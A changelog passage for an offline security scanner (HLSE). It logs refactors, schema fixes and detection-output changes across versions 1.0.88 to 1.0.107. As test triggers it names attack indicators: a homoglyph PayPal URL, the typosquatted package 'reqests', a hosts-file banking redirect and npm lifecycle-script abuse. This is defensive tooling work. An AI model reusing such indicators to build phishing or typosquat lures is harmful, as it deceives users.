    `manifest_summary` line; exits 1 if any package reaches `--fail-on`. An
    un-inferable ecosystem or unreadable file is a usage error (exit 2).

  Pure orchestration of the existing `hlse_check_package()` — no scoring
  change (F1=1.000 preserved); the single-name path is byte-identical.

  - **Schema**: `package` verdict gains an optional `ecosystem` field; new
    `schema/hlse_manifest_summary.schema.json` for the summary line.
  - **Tests**: 9 new CLI integration tests — pip and npm parsing (incl.
    top-level-field exclusion), JSON schema validation, clean/exit-0,
    un-inferable-ecosystem and missing-file usage errors, and an F1-invariant
    single-name check (683 total).

## [1.0.107] — 2026-07-02

### Added
- **Perspective 107 (roadmap P0-1): baseline / allowlist / inline suppression
  for `scan` — the single biggest blocker to commercial CI adoption.**

  A commercial-gap audit (vs gitleaks/detect-secrets/GitGuardian) found HLSE
  had no way to accept known findings, so a brownfield repo's very first
  `scan` fails the `--fail-on` gate forever and can never be added to CI. This
  release adds the detect-secrets-style baseline workflow, entirely offline
  and dependency-free:

  - `--fingerprints scan <dir>` emits one stable fingerprint per finding
    (16 hex chars + pattern_id + relative path) and exits 0. Redirect to a
    file to create a baseline: `hlse_core --fingerprints scan . > .hlse-baseline`.
  - `--baseline <file>` suppresses every finding whose fingerprint is listed;
    only NEW findings count toward the gate. An unreadable baseline path is a
    usage error (exit 2), never a silent pass.
  - Inline `hlse:allow` on a scanned line suppresses findings on that line
    (gitleaks:allow-style).

  The fingerprint is a 64-bit FNV-1a hash of `relpath\0pattern_id\0match`,
  rendered as 16 hex chars. It deliberately omits the line number, so a
  finding that moves lines stays suppressed. Applies to all three `scan`
  checks (secret, file-masquerade, embedded-URL) in text, JSON, and SARIF
  modes; the JSON `scan_summary` threat count reflects suppression.

  Implemented purely as a post-detection output filter — no detection logic,
  score, or threshold touched (F1=1.000 preserved). `--help` and the man page
  document the workflow.

  - **Tests**: 10 new CLI integration tests — fingerprint generation, full
    baseline suppress/only-new-fails cycle, JSON summary reflection, bad-path
    usage error, inline `hlse:allow`, and an F1-invariant check (674 total).

## [1.0.106] — 2026-07-02

### Fixed
- **Perspective 106 (roadmap P2-3): the `email` subcommand no longer silently
  ignores `--from`; it explains why the flag does not apply.**

  `--from <channel>` sets a delivery-channel prior that boosts URL/text
  scores, but email headers are BY DEFINITION received over email — the
  channel is intrinsic and fixed, and a `--from` override (especially a
  non-email one like `sms`) is meaningless for header forensics. The flag was
  accepted and silently dropped, which reads like a bug to a user who passed
  it deliberately. The `email` command now prints a one-line stderr note when
  `--from` is present, clarifying that the channel prior is intrinsic and not
  applied. stdout (the JSON/text verdict) is unchanged; F1=1.000 preserved.

  - **Tests**: 2 new CLI integration tests — `--from` with `email` emits the
    stderr note with the JSON verdict unchanged on stdout, and `email`
    without `--from` emits no note (664 total).



### Fixed
- **Perspective 105 (roadmap P1-2): `secret --stdin` / `email --stdin` no
  longer silently truncate at 64 KB — a demonstrated false negative.**

  A commercial-gap audit (vs gitleaks/trufflehog/detect-secrets) found that
  `read_stdin_all()` filled a 64 KB stack buffer and discarded the rest with
  no warning, so a credential past that offset read as clean (exit 0). This
  was reachable through the *shipped* `examples/pre-commit-hook.sh`, which
  pipes files up to 1 MB into `secret --stdin` — any secret in the tail of a
  64 KB–1 MB file was a silent miss. Measured: an AWS key at a 70 KB offset
  returned exit 0 (the same key alone is ISOLATE[80]).

  Two-part fix:
  - Both `--stdin` buffers enlarged from 64 KB to 1 MiB, BSS-allocated
    (`static`, not stack), matching the shipped hook's own 1 MB file-size
    guard — so no in-scope input is truncated at all.
  - `read_stdin_all()` now detects overflow past the buffer, drains the rest
    of stdin (so a pipe writer never blocks), and prints a precise stderr
    warning naming how many bytes were dropped and that a clean result is
    NOT authoritative for the full input — a backstop for inputs larger than
    1 MiB.

  Pure I/O-layer fix — no detection logic, score, or threshold touched
  (F1=1.000 preserved).

  - **Tests**: 3 new CLI integration tests — a 70 KB-offset secret is now
    detected, a >1 MiB input emits the truncation warning, and a normal
    small input emits no spurious warning (662 total).

## [1.0.104] — 2026-07-01

### Fixed
- **Perspective 104: completed the P101-103 DRY consolidation — `esp` and
  `clipboard` (the two remaining BLOCK+-only kinds) had the same JSON/
  plaintext advisory-text duplication and drift.**

  Socratic question: esp and clipboard never needed the ALERT-band split
  (their scores are always 0 or 60+/70+/95+ — bimodal, never landing in
  40-59 alone) — but does that mean they escaped the duplication problem
  P101-103 fixed for the other five kinds? No: both built JSON advisory text
  from `static const char[]` literals while the matching plaintext path
  independently re-typed shorter, differently-worded text for the same
  verdict (e.g. clipboard's JSON `verify` ended "...before confirming **the
  transaction**"; plaintext silently dropped "the transaction").

  New shared accessors `esp_pattern_text()`/`_objective_text()`/
  `_verify_text()`/`_triage_text()`/`_cascade_text()` and the matching
  `clipboard_*` group replace every independent copy — completing the same
  consolidation applied to file (P101), secret (P102), and protect/network/
  package (P103). All 7 kinds with a pattern/objective/verify/triage/
  cascade_risk advisory structure now share one definition per field,
  guaranteeing JSON and CLI plaintext output describe every verdict
  identically.

  Pure refactor — no detection logic, score, or threshold touched
  (F1=1.000 preserved); every JSON value is unchanged.

  - **Tests**: 3 new CLI integration tests use a real reproducible ESP
    bootkit-indicator trigger and a real clipboard-hijack trigger to assert
    JSON/plaintext word-for-word agreement, plus an F1-invariant ISOLATE-
    score check (656 → 659 total).

## [1.0.103] — 2026-07-01

### Fixed
- **Perspective 103: extended the P101/P102 DRY consolidation to `protect`,
  `network`, and `package` — all three had the same JSON/plaintext advisory-
  text duplication and drift.**

  Socratic question: P101 and P102 found and fixed pattern/objective/verify/
  triage/cascade_risk text duplicated between JSON and plaintext for `file`
  and `secret` — do the other kinds with the same ALERT-band advisory
  structure (`protect` from P100, `network` and `package` from P95/96/97)
  have it too? Yes, all three: each kind's JSON path built its advisory
  lines from `static const char[]` literals, while the matching plaintext
  path independently re-typed shorter, differently-worded `printf` literals
  describing the same verdict (e.g. `protect`'s JSON objective said
  "ransomware encrypts accessible files **and demands payment**"; plaintext
  silently dropped the "and demands payment" clause).

  New shared accessors — `protect_pattern_text()`/`_objective_text()`/
  `_verify_text()`/`_triage_text()`/`_cascade_text()`, and matching
  `network_*`/`net_pattern_text()` and `package_*`/`package_pattern_text()`
  groups — replace every independent copy. Pure refactor — no detection
  logic, score, or threshold touched (F1=1.000 preserved); every JSON value
  is unchanged, and plaintext now emits the same (previously fuller, JSON-
  side) wording word-for-word.

  - **Tests**: 4 new CLI integration tests assert JSON/plaintext word-for-
    word agreement for `protect` (real SMB canary-file trigger), `network`
    (real `/etc/hosts` redirect trigger, backed up/restored via `trap`), and
    `package` (real multi-registry match), plus an F1-invariant BLOCK+ check
    (652 → 656 total).

## [1.0.102] — 2026-07-01

### Fixed
- **Perspective 102: applied the P101 DRY consolidation to the `secret` kind
  too — and the refactor surfaced a real "blast radius" naming collision in
  `scan` output.**

  Socratic question: does `secret` have the same four-way advisory-text
  duplication P101 found and fixed for `file`? Yes — the pattern label,
  verify, triage, and cascade_risk text were each independently copy-pasted
  at the standalone `secret` JSON site and the `scan`-embedded JSON site
  (identical text under two different names: `sec_vrf`/`ss_vrf`,
  `sec_tri`/`ss_tri`, `sec_cas`/`ss_cas`), and separately reduced to shorter,
  differently-worded `printf` literals at both plaintext sites.

  New shared accessors `secret_pattern_label()`, `secret_verify_text()`,
  `secret_triage_text()`, `secret_cascade_text()` replace all four copies —
  mirroring `file_masquerade_objective()`/`file_masquerade_verify()` from
  P101.

  Unifying JSON and plaintext wording surfaced a genuine bug: the verify
  text said "...setting the blast radius" (meaning "the scope of what was
  accessed"), and once plaintext started using the same full text as JSON, a
  single-credential `scan` began printing the substring "blast radius" —
  colliding with `scan`'s unrelated, distinct `⚠ BLAST RADIUS:` warning for
  credentials spanning multiple asset classes (a pre-existing feature). A
  test asserting single-asset-class scans never print "blast radius" caught
  this immediately. Reworded to eliminate the collision.

  Pure refactor plus a wording fix — no detection logic, score, or threshold
  touched (F1=1.000 preserved); all four sites and JSON-vs-plaintext now
  emit byte-identical wording for the same verdict.

  - **Tests**: 4 new CLI integration tests assert standalone/scan agreement,
    JSON/plaintext word-for-word agreement, that the BLAST RADIUS collision
    is gone, and an F1-invariant ISOLATE-score check (648 → 652 total).

## [1.0.101] — 2026-07-01

### Fixed
- **Perspective 101: audit schema's per-finding severity mapping was wrong
  (deficiency), and the file-masquerade advisory text was duplicated four
  independent times across standalone/scan × JSON/plaintext (excess).**

  Socratic audit of both directions — missing correctness vs. redundant
  maintenance burden:

  **Deficiency**: `hlse_audit_verdict.schema.json`'s per-finding `severity`
  description read "0=LOW 1=INFO 2=MED 3=HIGH 4=CRITICAL 5=CRITICAL", but the
  actual code (`sev_str[] = {"PASS","INFO","LOW","MED","HIGH","CRIT"}`) maps
  severity 4 to **HIGH**, not CRITICAL, and severity 0 to PASS, not LOW. A
  SIEM rule built from the schema (e.g. "route severity >= 4 as CRITICAL")
  would misclassify every HIGH finding as CRITICAL. Fixed to the actual
  0=PASS/1=INFO/2=LOW/3=MED/4=HIGH/5=CRITICAL mapping, with a note
  distinguishing it from the unrelated top-level 0-4 action-band `severity`.

  **Excess**: the file-masquerade pattern classification (RLO / double-
  extension / macro / PDF) and its "attacker's goal" / "verify first"
  advisory lines were copy-pasted as four independent inline copies — the
  standalone `file` command's JSON and plaintext paths, and `scan <dir>`'s
  embedded-file JSON and plaintext paths — right next to the single shared
  `file_verdict_pattern_id()` that already did the identical reason-string
  match for the SIEM token. Four independently maintained copies is exactly
  how the standalone-vs-scan field asymmetry P95 had to fix originally
  happened, and a side effect surfaced during this audit: the plaintext
  "Attacker's goal"/"Verify first" wording had quietly drifted shorter and
  different from the JSON `objective`/`verify` text for the same verdict.

  New shared accessors `file_classify_pattern()`, `file_masquerade_
  objective()`, `file_masquerade_verify()` replace all four copies. Pure
  refactor plus a consistency fix — no detection logic, score, or threshold
  touched (F1=1.000 preserved); all four sites, and JSON vs. plaintext, now
  emit byte-identical wording for the same verdict.

  - **Tests**: 4 new CLI integration tests assert the schema's severity
    description matches the code, that standalone-`file` and scan-embedded-
    file agree on `objective` text, that JSON and plaintext `verify` text are
    now word-for-word identical, and an F1-invariant BLOCK+ check
    (644 → 648 total).

## [1.0.100] — 2026-07-01

### Fixed
- **Perspective 100: `protect` (ransomware/SMB/MBR detection) was the only
  verdict kind still missing `hlse_version` and `severity`, had no JSON
  Schema file, no `pattern_id`, and the same ALERT-band advisory gap P95-98
  closed elsewhere.**

  Continuing the systematic per-kind audit that started with the ALERT-band
  fixes (P95-98) and the Stripe-key correctness fix (P99): `protect` — one of
  the most safety-critical commands (ransomware detection) — was never
  brought in line with the `hlse_version`/`severity` contract every other
  kind (url/text/file/secret/email/network/esp/package/paste/clipboard) has
  carried since P84/P85. It also had no entry in the `--list-patterns`
  registry and no normative JSON Schema, unlike all 12 other kinds.

  A single SMB canary-file access (+40, real and reproducible: place a
  well-known canary filename in a directory and read it) or a mass-rename
  detection (+40) lands the `protect` verdict in ALERT (40-59) alone — same
  as the P95-98 pattern, `pattern`/`objective`/`verify` only fired at score
  >= 60.

  Fixes, all pure advisory/output — no detection logic, score, or threshold
  touched (F1=1.000 preserved; BLOCK+ verdicts are byte-identical):
  - `protect` JSON now includes `hlse_version` and `severity`, matching
    every other kind.
  - New `pattern_id`: `HLSE-PROTECT-RANSOM`, registered in `--list-patterns`.
  - `pattern`/`objective`/`verify` now fire from score >= 40 (ALERT floor);
    `triage`/`cascade_risk` (disconnect-network incident response, which
    presumes active compromise) stay BLOCK+-only (>= 60).
  - New `schema/hlse_protect_verdict.schema.json` — the last of the 13
    verdict kinds to get a normative schema.
  - `hlse_pattern_registry.schema.json`'s `kind` enum gained `"protect"`.

  - **Tests**: 5 new CLI integration tests use a real reproducible SMB
    canary-file access to assert `hlse_version`/`severity`/`pattern`/
    `pattern_id`/`verify` in ALERT with `triage`/`cascade_risk` absent, a
    clean-verdict schema check, and registry presence (638 → 643 total).

## [1.0.99] — 2026-07-01

### Fixed
- **Perspective 99: `secret` verdict no longer claims a Stripe *publishable*
  key (`pk_live_`) can "issue charges, view customer payment data, and issue
  refunds" — that capability belongs only to Stripe *secret* keys.**

  Socratic question: does the `objective` text describe what THIS SPECIFIC
  credential type can actually do, or does it lump every "Stripe" finding
  under one payment-processing narrative regardless of key kind? Answer:
  the latter, and it was wrong. `secret_objective_for()` matched
  `strstr(type, "Stripe")` for both secret keys (`sk_live_`/`rk_live_`, which
  really do grant charge/refund access) and the publishable key
  (`pk_live_`), which by Stripe's own documentation is designed to be
  embedded in public client-side code and cannot perform any of those
  actions. Reachable whenever a publishable-key finding combines with
  another to cross the score >= 60 objective/remediation/triage threshold
  (e.g. alongside a JWT) — the user would read that their public,
  by-design-safe key just handed an attacker refund access.

  Also: `secret` was the last verdict kind with zero advisory content below
  score 60 (the systematic gap P95-98 closed for url/text/network/package/
  file) — `hlse_exoneration_for()` gained a `"secret"` case.

  Fixes, all pure advisory/output — no detection logic, score, or threshold
  touched (F1=1.000 preserved; AWS/GitHub/other real-secret objectives are
  byte-identical):
  - `secret_objective_for("Stripe Live Publishable")` now returns the
    accurate claim ("none directly ... cannot create charges, issue
    refunds, or read customer payment data").
  - New `secret_finding_caveat()`: an unconditional (any score, not just a
    score-band hedge) factual note for this credential type, emitted as a
    new `"caveat"` JSON field / `⚠ Caveat:` CLI line, explaining rotation is
    not required and naming the actual at-risk key type
    (`sk_live_`/`rk_live_`).
  - `hlse_exoneration_for("secret", score)`: new 15-59 band hedge (test-mode
    keys, doc placeholders, low-entropy samples).

  - **Schema update**: `hlse_secret_verdict.schema.json` gained `exoneration`
    and `caveat` properties.
  - **Tests**: 5 new CLI integration tests cover the standalone ALERT-band
    caveat, absence of the caveat on a real AWS secret, the corrected
    objective text in a combined BLOCK+ scenario, the CLI plaintext caveat
    line, and an F1-invariant check on the unmodified AWS objective
    (633 → 638 total).

## [1.0.98] — 2026-07-01

### Changed
- **Perspective 98: `file` verdict gets the ALERT-band advisory fix — worse
  than P95/96/97, `file` had NO advisory content at all below score 60, not
  even the benign-explanation `exoneration` other kinds already had.**

  Continuing the systematic per-kind audit: a single medium-confidence
  heuristic — e.g. Cabinet-magic (MSCF) file content wearing a non-`.cab`/
  `.msi` extension (+40), or an image/archive magic byte wearing an
  executable extension (+40 to +55) — lands the file verdict in ALERT (40-59)
  alone. Unlike url/text/network/package, `hlse_exoneration_for()` had no
  `"file"` case at all, so an ALERT [40] file verdict rendered nothing but
  the raw reason string — no pattern, no attacker objective, no independent
  check, and no benign explanation either. This was the deepest version of
  the gap P95-P97 closed elsewhere.

  `pattern`/`pattern_id`/`objective`/`verify` now fire from score >= 40 in
  both the standalone `file` command and the per-file path inside
  `scan <dir>`. `hlse_exoneration_for()` gained a `"file"` case (15-59 band).
  `triage`/`cascade_risk` (post-open incident response — disconnect network,
  rotate credentials) stay BLOCK+-only (>= 60), matching the P95-97
  precedent exactly.

  Pure advisory/JSON output change — no detection logic, score, or threshold
  touched. F1=1.000 preserved; the polyglot-plus-executable-extension BLOCK+
  case (score 70) is byte-identical.

  - **Schema update**: `hlse_file_verdict.schema.json` gained an
    `exoneration` property (previously entirely absent from the schema) and
    `pattern`/`objective`/`verify` descriptions updated to the ALERT floor.
  - **Tests**: 6 new CLI integration tests exercise a real reproducible
    Cabinet-magic mismatch (`report.dat` with `MSCF` header) via both the
    standalone `file` command and `scan <dir>`, asserting pattern/verify/
    exoneration appear in ALERT while triage/cascade_risk stay absent, plus
    a BLOCK+ F1-invariant check (626 → 632 total).

## [1.0.97] — 2026-07-01

### Changed
- **Perspective 97: `package` verdict gets the same ALERT-band advisory fix
  as URL/text/paste/scan (P95) and network (P96) — `pattern`/`objective`/
  `verify` now fire from score >= 40, not just >= 60.**

  Continuing the systematic audit across every verdict kind: a package name
  that fuzzy-matches known packages in 2+ ecosystems at once — e.g. `reqests`
  with no ecosystem given, which is edit-distance 1 from pip's `requests` AND
  edit-distance 2 from cargo's `reqwest` — lands the verdict at score 50
  (ALERT) alone. The `n_matches == 1 && distance == 1` amplifier that bumps a
  single match to 70 (BLOCK) never fires once a second registry also matches,
  so the ambiguous case scored LOWER than the unambiguous one while getting
  LESS advisory content: no `pattern`, `objective`, or `verify` — only raw
  match data and an exoneration hint.

  `triage`/`cascade_risk` (uninstall-and-rotate guidance, which presumes the
  package was already installed) stay BLOCK+-only (>= 60), matching the
  P95/P96 precedent exactly.

  Pure advisory/JSON output change — no detection logic, score, or threshold
  touched. F1=1.000 preserved; the single-registry BLOCK+ case (score 70) is
  byte-identical.

  - **Schema update**: `hlse_package_verdict.schema.json`'s `objective` and
    `verify` descriptions updated from "score >= 60 only" to the ALERT floor.
  - **Tests**: 4 new CLI integration tests use a real reproducible multi-
    ecosystem match (`reqests`, no ecosystem arg) to assert pattern/verify
    appear in ALERT while triage/cascade_risk stay absent, in both JSON and
    CLI plaintext, plus a BLOCK+ F1-invariant check (621 → 625 total).

## [1.0.96] — 2026-07-01

### Changed
- **Perspective 96: `network` verdict gets the same ALERT-band advisory fix
  P95 gave URL/text/paste/scan — `pattern`/`objective`/`verify` now fire from
  score >= 40, not just >= 60.**

  Continuing the audit from P95: a single N4 finding (`/etc/hosts` banking-
  domain redirect — pharming, +50) or N2 finding (duplicate-metric default
  routes — routing injection, +55) lands the network verdict in ALERT (40-59)
  on its own, but the `network` command only emitted `pattern`, `pattern_id`,
  `objective`, and `verify` at score >= 60 — identical to the gap P95 closed
  elsewhere. A user whose hosts file was silently redirecting `paypal.com`
  saw a bare ALERT [50] with raw reasons and an exoneration hint, but no
  identification of the attack class or an independent check to run.

  `triage` and `cascade_risk` (kill-the-process / rotate-credentials — post-
  incident guidance that presumes disruptive action) correctly stay
  BLOCK+-only (>= 60), matching the P95 precedent exactly.

  Pure advisory/JSON output change — no detection logic, score, or threshold
  touched. F1=1.000 preserved.

  - **Schema update**: `hlse_network_verdict.schema.json`'s `objective` and
    `verify` descriptions updated from "score >= 60 only" to the ALERT floor.
  - **Tests**: 3 new CLI integration tests trigger a real N4 hosts-file
    redirect (backed up and restored via `trap`, safe in this isolated
    ephemeral container) and assert pattern/verify appear in ALERT while
    triage/cascade_risk stay absent, in both JSON and CLI plaintext.

## [1.0.95] — 2026-07-01

### Changed
- **Perspective 95: `verify` (pre-action independent-check guidance) now fires
  from the ALERT floor (score >= 40), not just BLOCK+ (score >= 60).**

  Socratic gap identified while auditing overall product strengths/weaknesses:
  an ALERT-band verdict (40-59) — the score band where HLSE is LEAST certain —
  showed a pattern label and an "attacker's goal" line but left `verify`,
  `triage`, and `cascade_risk` all NULL. A user reading `https://paypaI.com`
  scored ALERT [50] had no actionable next step; only a BLOCK [60+] verdict
  told them what to do. But ALERT is exactly the band where an independent
  check is most valuable — a BLOCK verdict is confident enough that verify is
  a courtesy, while an ALERT verdict genuinely needs it to resolve the
  ambiguity the score itself admits to.

  `hlse_verification_for` (URL) and `hlse_text_verify` (text) now gate at
  score >= 40 instead of >= 60. `triage` and `cascade_risk` — post-incident
  guidance that presumes the user already acted — correctly stay BLOCK+-only
  (>= 60); only the pre-action `verify` lens widened. In the 40-59 overlap,
  `verify` now co-occurs with `exoneration` — together they let the user
  decide (an independent test to confirm OR a benign read to dismiss) instead
  of just watching a bare score.

  This also fixed a deeper asymmetry: the same URL scanned standalone versus
  found embedded inside a scanned file previously produced different JSON
  shapes at ALERT — the embedded-URL path in `scan` emitted only `reasons` +
  `exoneration`, dropping `pattern`, `pattern_id`, `objective`, and `safe_url`
  entirely below score 60, while the standalone URL path already showed them
  unconditionally. Both paths, plus the `paste` and `email` (body-pattern)
  commands, now agree.

  Pure advisory/JSON output change — no detection logic, score, or threshold
  touched (F1=1.000 invariant preserved; BLOCK+ verdicts are byte-identical).

  - **Schema updates**: `hlse_url_verdict`, `hlse_text_verdict`,
    `hlse_paste_verdict`, and `hlse_email_verdict` schemas' `verify` field
    descriptions updated from "score >= 60 only" to the new ALERT floor.
  - **Tests**: 7 new CLI integration tests cover text/URL/scan/paste ALERT-band
    verify emission, confirm triage/cascade_risk stay BLOCK+-only, and assert
    BLOCK+ verdicts are unchanged (617 total, 0 failed). 2 pre-existing tests
    that asserted the old ">= 60 only" contract were updated to assert the new
    ">= 40" contract.

## [1.0.94] — 2026-06-30

### Changed
- **Perspective 94: email JSON verdicts now emit `signal_count`, `confidence`, and
  `pattern_id` fields for proper SIEM/SOAR integration and API symmetry.**

  Socratic gap identified: email verdicts were missing advisory fields that other
  verdict kinds (text, url, file, secret) provide, creating asymmetry in the JSON
  API and hindering SIEM ingestion pipelines. The schema defined these fields but
  the implementation did not emit them consistently.

  - **signal_count** (1 or 2): counts independent analysis signals — 1 = header-only
    analysis, 2 = header + body text both analyzed for patterns.
  - **confidence**: describes why the verdict is trustworthy — e.g., "two independent
    signals — header authentication + body text both analyzed" when both components
    fired.
  - **pattern_id**: emits stable HLSE-* token (e.g., `HLSE-BEC-WIRE`, `HLSE-BEC-CEO`)
    when body patterns are detected, enabling SOAR routing on email body attacks.
  - **exoneration**: when email header score is 15–59 (borderline), emits potential
    benign explanations (e.g., "internal payment requests do arrive by email. Decisive
    test: call the supposed sender on a number you already have").

  Pure advisory/JSON output change — no detection logic or scoring modified (F1=1.000
  invariant preserved). Email verdicts now match the field structure of URL, text,
  and file verdicts for consistent SIEM mapping.

  - **Schema update**: `hlse_email_verdict.schema.json` now defines `signal_count`
    and `confidence` fields.
  - **Tests**: 6 new CLI integration tests verify signal_count/confidence emission,
    pattern_id presence for body patterns, exoneration for borderline scores, and
    schema validation (609 total, 0 failed).

## [1.0.93] — 2026-06-24

### Changed
- **Perspective 93: email `blind_spot` warns that authentication PASS
  (SPF/DKIM/DMARC) is not a safety guarantee — aligns the clean-email hedge with
  2025 DMARC-bypass threat intel.**

  Research-driven (Qiita / Zenn + threat-intel survey on DMARC/SPF/DKIM): DMARC
  only stops *exact-domain* spoofing. Once a domain enforces DMARC, attackers
  pivot to two vectors that **pass SPF/DKIM/DMARC by design**: (1) **display-name
  spoofing** — a brand name in the display field with a different (authenticated)
  From domain, and (2) **attacker-owned look-alike / cousin domains**. Reporting
  notes 63% of campaigns pivot to look-alike domains within ~10 days of DMARC
  enforcement. A user who reads "headers clean / SPF pass" can be falsely
  reassured.

  Socratic question: "HLSE's clean-email verdict hedges with a blind_spot, but it
  only mentions a 'clean-domain look-alike'. The bigger trap is that a green
  authentication result is itself not a safety signal — display-name spoofing and
  attacker-owned cousin domains pass DMARC. Does our hedge make that explicit, or
  could a user still infer 'auth pass = safe'?"

  Pure advisory/output change — no detection logic, score, or threshold touched
  (clean email stays score 0 / SAFE). The email `blind_spot` now states that
  authentication PASS is not a safety guarantee, names the two DMARC-bypass
  vectors (display-name spoofing, look-alike/cousin domains) plus breached
  legitimate accounts, and tells the user to read the actual From-address domain
  character-by-character and verify out-of-band.

  - **Tests**: 2 new CLI integration tests assert the DMARC-pass caveat and its
    named vectors are present, and that the clean-email score is unchanged
    (603 total, 0 failed).

## [1.0.92] — 2026-06-24

### Changed
- **Perspective 92: package `verify` advisory names the preventive control
  (`--ignore-scripts`) — aligns guidance with 2025-2026 supply-chain threat
  intel.**

  Research-driven (Qiita / Zenn survey on npm/PyPI supply-chain defense): the
  dominant 2025-2026 attack vector is the **Shai-Hulud self-replicating npm
  worm**, which abuses install **lifecycle scripts** (`preinstall`,
  `postinstall`, and — in V2 — `prepare`) that auto-execute on `npm install`
  with the user's privileges, *before the install even completes*. The single
  most effective preventive control the research names is installing with
  **`--ignore-scripts`** (npm/pnpm) / `--no-build` (uv/pip).

  Socratic question: "HLSE's package verdict already names Shai-Hulud and tells
  the user to inspect lifecycle scripts *after* install. But the highest-leverage
  action is preventive — install with `--ignore-scripts` so the malicious hook
  never runs. Why does our 'verify first' advisory (the step *before* the user
  installs) omit the one flag that actually neutralizes the vector?"

  Pure advisory/output change — no detection logic, score, or threshold
  touched (typosquat verdict stays score 70 / BLOCK / severity 3 /
  `HLSE-PKG-TYPOSQUAT`):
  - The package `verify` advisory (JSON + text) now recommends installing with
    `--ignore-scripts` / `--no-build` as the preventive control, explaining that
    lifecycle hooks run before install completes.
  - The `triage` advisory now enumerates all three exploited hooks
    (`preinstall`/`postinstall`/`prepare`) rather than just the first two,
    reflecting the Shai-Hulud V2 shift to `preinstall`/`prepare`.

  - **Tests**: 3 new CLI integration tests assert the preventive control is
    named, JSON/text advisories stay in sync, and the score is unchanged
    (601 total, 0 failed).

## [1.0.91] — 2026-06-24

### Added
- **Perspective 91: SARIF results carry stable `pattern_id` tokens + enriched
  rule metadata — closes the stable-token gap at the GitHub Code Scanning
  surface.**

  Research-driven (Qiita / Zenn survey): SARIF → GitHub Code Scanning is the
  standard way to surface scanner findings, and `ruleId` is how the GitHub
  Security tab groups, tracks, and deduplicates alerts across commits. HLSE's
  SARIF emitted only 3 coarse rule IDs (`secret`, `phishing-url`,
  `file-masquerade`) while the rest of the API exposes 61 stable `pattern_id`
  tokens (P88). In the Security tab an AWS-key leak and a private-key leak
  collapsed into one rule; a homoglyph URL and a typosquat into another — the
  stable-token routing established by P78–P90 was lost exactly where triage
  happens.

  Socratic question: "We built stable tokens for SIEM routing — but at the
  GitHub Code Scanning surface every finding still collapses into one of three
  buckets. How does a security team triage by attack class there?"

  Pure output change — no detection logic touched:
  - Each SARIF `result.properties` now carries the stable `pattern_id`
    (`HLSE-SECRET-AWS`, `HLSE-URL-HOMOGLYPH`, `HLSE-FILE-DOUBLE-EXT`, …) so SOAR
    automation and per-class triage work directly off the Code Scanning export.
  - Each SARIF rule gains a `helpUri` (→ `docs/SIEM_INTEGRATION.md`) and
    `properties.tags` (`security` + a CWE tag: CWE-798 secret, CWE-1021 URL,
    CWE-646 file) for richer GitHub rendering.

### Fixed
- The embedded-URL JSON scan path emitted `pattern` without the matching
  `pattern_id` (the standalone `url` path has emitted both since P79). The scan
  path now emits `pattern_id` too, so SARIF and JSON scan outputs agree and the
  stable-token contract holds across every URL emission site.

  - **Tests**: 3 new CLI integration tests pin SARIF pattern_id coverage, rule
    metadata, and SARIF↔JSON agreement (598 total, 0 failed).

## [1.0.90] — 2026-06-24

### Added
- **Perspective 90: SIEM/SOAR integration guide (OCSF + ECS field mapping) —
  closes the data-normalization gap for SIEM ingestion.**

  Research-driven (Qiita / Zenn survey): the dominant theme across Japanese
  security-engineering writing on SIEM/SOAR is that **data normalization is the
  main deployment bottleneck** — every log source has its own field names, so
  teams hand-build custom parsers to map onto the open standards (OCSF, ECS).
  HLSE had invested heavily in machine-readable output (P78–P89: stable
  `pattern_id` tokens, the `--list-patterns` registry, 13 normative schemas) but
  shipped no guide for translating its proprietary fields onto those standards.
  A SIEM engineer ingesting HLSE still had to reverse-engineer the semantics.

  Socratic question: "We made the output machine-readable and self-describing.
  But the consumer's real target is OCSF or ECS, not HLSE's own field names. How
  does a detection engineer know that HLSE `severity` 3 means OCSF
  `severity_id` 4 (High), without reading our source?"

  Pure documentation change — no code touched. New `docs/SIEM_INTEGRATION.md`:
  - HLSE envelope → **OCSF Detection Finding** (class_uid 2004) attribute table
    + a working `jq` transform.
  - HLSE envelope → **ECS** (`event.*`/`rule.*`/`threat.*`) field table + a
    working `jq` transform.
  - The `severity` (0–4) → OCSF `severity_id` (0–6) → ECS `event.severity`
    conversion table, pinned to the engine's actual bands.
  - CI/CD exit-code contract, `scan_summary.max_severity` gating, ndjson
    streaming ingestion (Splunk HEC / Elastic / Datadog), and using
    `--list-patterns` as a SOAR routing table.
  - README JSON section now links the guide.

  - **Tests**: 3 new CLI integration tests that pin the documented OCSF/ECS
    severity mapping to live engine output, so the guide cannot drift
    (595 total, 0 failed).

## [1.0.89] — 2026-06-23

### Added
- **Perspective 89: normative JSON Schemas for all 13 verdict kinds — closes
  the schema-parity gap across the complete JSON API.**

  Socratic question: "We've built a complete JSON contract across P78–P88:
  uniform envelope (kind/hlse_version/score/action/severity), stable
  pattern_id tokens for SIEM routing, and a discoverable registry. But only
  5 kinds (url, text, file, secret, scan_summary) have normative schemas — the
  other 8 (esp, package, paste, network, email, clipboard, audit,
  pattern_registry) are unvalidated. A consumer can't validate these kinds
  against a schema. How do they know the JSON they received is the shape
  HLSE promised?"

  Pure documentation change — no code modifications. Added 8 new normative
  JSON Schemas (draft 2020-12):
  - `hlse_esp_verdict.schema.json` — UEFI bootkit indicators
  - `hlse_package_verdict.schema.json` — supply-chain typosquat checks
  - `hlse_paste_verdict.schema.json` — pastejacking detection
  - `hlse_network_verdict.schema.json` — C2/exfiltration indicators
  - `hlse_email_verdict.schema.json` — BEC and spoofing attacks
  - `hlse_clipboard_verdict.schema.json` — cryptocurrency hijacking
  - `hlse_audit_verdict.schema.json` — OS hardening assessment
  - `hlse_pattern_registry.schema.json` — the token registry (P88)

  All schemas follow the same structure as the existing 5: required fields,
  optional advisory fields (pattern/objective/verify/triage/cascade_risk at
  score ≥ 60), exoneration fields (40 ≤ score < 60), and blind_spot (score 0).
  New pattern_id tokens map consistently to their schemas' `const` definitions.

  - **Tests**: 5 new CLI integration tests validating schema coverage and
    spot-checking verdicts against their schemas (592 total, 0 failed).

## [1.0.88] — 2026-06-23

### Added
- **Perspective 88: `--list-patterns` — the discoverable registry of stable
  `pattern_id` tokens.**

  Socratic question: "P78–P87 made every pattern-bearing verdict emit a stable
  HLSE-* `pattern_id` so SIEM/SOAR pipelines can route on an append-only token
  instead of prose. But a stable token is only useful to automation if the FULL
  set is discoverable — and right now the only way to learn which tokens exist
  is to grep the C source. How does a detection engineer build a complete
  routing table without reading our implementation?"

  Pure output change — no detection logic touched. A new meta-command
  (`--list-patterns`, sibling to `--version` / `--self-test`) emits the
  authoritative registry of all 61 tokens:
  - **`--json --list-patterns`** → `{"kind":"pattern_registry","hlse_version":…,
